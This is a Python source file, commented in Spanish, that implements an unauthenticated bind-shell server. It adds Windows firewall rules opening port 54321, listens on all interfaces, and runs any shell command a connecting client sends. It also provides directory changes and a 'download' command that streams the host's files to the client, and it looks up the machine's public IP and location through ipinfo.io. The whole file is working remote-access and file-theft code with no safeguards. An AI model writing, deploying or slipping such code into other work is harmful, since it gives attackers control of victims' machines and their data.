import socket
import threading
import os
import subprocess
import time
import requests
import platform

############################################################################################################

def config_port_firewall():
    if platform.system() == 'Windows':
        try:
            # regla para permitir trafico entrante en el puerto
            subprocess.run(['netsh', 'advfirewall', 'firewall', 'add', 'rule',
                            'name=Python_Server_in', 'dir=in', 'action=allow',
                            'protocol=TCP', 'localport=54321'], check=True)

            # regla para permitir trafico saliente en el puerto
            subprocess.run(['netsh', 'advfirewall', 'firewall', 'add', 'rule',
                            'name=Python_Server_out', 'dir=out', 'action=allow',
                            'protocol=TCP', 'localport=54321'], check=True)

            print("Firewall rule added successfully.")
        except subprocess.CalledProcessError as e:
            print(f"Firewall Error: {e}")
"""
    elif platform.system() == 'Linux':
        try:
            # permitir trafico entrante en el puerto
            subprocess.run(['sudo', 'iptables', '-A', 'INPUT', '-p', 'tcp', '--dport', '54321', '-j', 'ACCEPT'], check=True)
            # permitir trafico saliente en el puerto
            subprocess.run(['sudo', 'iptables', '-A', 'OUTPUT', '-p', 'tcp', '--dport', '54321', '-j', 'ACCEPT'], check=True)
            print("Firewall rule added successfully.")
        except subprocess.CalledProcessError as e:
            print(f"Firewall Error: {e}")
"""

############################################################################################################

def handle_client(client_socket):
    # manejar cada cliente en un hilo separado
    try:
        while True:
            # recibir comando del cliente
            command = client_socket.recv(4096).decode()

            # salir
            if command == 'exit':
                break

            elif command.split(" ")[0] == 'cd':
                try:
                    # cambio de directorio
                    os.chdir(" ".join(command.split(" ")[1:]))
                    client_socket.send("{}".format(os.getcwd()).encode('utf-8'))
                except Exception as e:
                    client_socket.send(str(e).encode('utf-8'))

            elif command.split(" ")[0] == 'download':
                try:        
                    # obtener el nombre del archivo
                    filename = command.split(" ")[1]

                    # ver si el archivo existe
                    if os.path.exists(filename):
                        # enviar el tamaño del archivo al cliente
                        file_size = os.path.getsize(filename)
                        client_socket.send(str(file_size).encode('utf-8'))

                        # esperar la confirmación del cliente para comenzar la descarga
                        client_socket.recv(1024)

                        # enviar el archivo al cliente
                        with open(filename, 'rb') as file:
                            while True:
                                data = file.read(1024)
                                if not data:
                                    break
                                client_socket.send(data)
                    else:
                        client_socket.send("File not found.".encode('utf-8'))

                except Exception as e:
                    client_socket.send(str(e).encode('utf-8'))

            else:
                try:
                    # ejecutar comando y obtener la salida
                    result = subprocess.getoutput(command)
                    # enviar la salida al cliente
                    client_socket.send(result.encode())
                except Exception as e:
                    client_socket.send(str(e).encode())

            time.sleep(2)

    except Exception:
        pass

    finally:
        client_socket.close()

############################################################################################################

def get_data():
    try:
        response = requests.get('https://ipinfo.io/json')
        data = response.json()
        return str(data)
    except Exception as e:
        return str(e)

############################################################################################################

#configurar el puerto en el firewall
config_port_firewall()

host = '0.0.0.0'
port = 54321

address_family = socket.AF_INET  # IPv4
socket_type = socket.SOCK_STREAM  # tipo de socket de flujo
# instancia del socket
server_socket = socket.socket(address_family, socket_type)
# tupla para la escucha
server_socket.bind((host, port))
# escuchar una conexion maxima
server_socket.listen(1)

print('Listening on {}:{}\n\n{}'.format(host, port, get_data()))

while True:
    try:
        # esperar la conexion del cliente y aceptar
        client_socket, client_address = server_socket.accept()

        # crear un hilo para manejar el cliente
        client_thread = threading.Thread(target=handle_client, args=(client_socket, ))
        client_thread.start()

    except Exception:
        client_socket.close()
        client_thread.join()
        pass
